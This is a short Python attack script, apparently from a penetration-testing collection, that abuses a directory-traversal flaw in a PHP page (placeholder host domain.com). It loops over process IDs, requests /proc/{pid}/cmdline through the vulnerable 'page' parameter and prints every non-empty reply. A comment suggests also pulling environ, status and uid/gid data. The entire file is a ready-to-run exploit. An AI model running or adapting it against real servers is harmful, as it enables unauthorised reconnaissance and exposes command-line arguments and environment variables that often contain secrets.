#!/usr/bin/env python3

# Enumerate processes via directory traversal.
# You can try to get other things in the /proc structure too like environ, status (has cap info), pid, ppid, uid/gid, etc.

import requests,sys

for pid in range(100000):
    url=f'http://domain.com/path/to/vulnerable/file.php?page=/proc/{pid}/cmdline'
    print(url)
    r=requests.get(url)

    response=r.text
    if response!="":
        print(f"pid {pid}: {response}")
        sys.stdout.flush()  # Using this vs print() so that "tee" works properly.
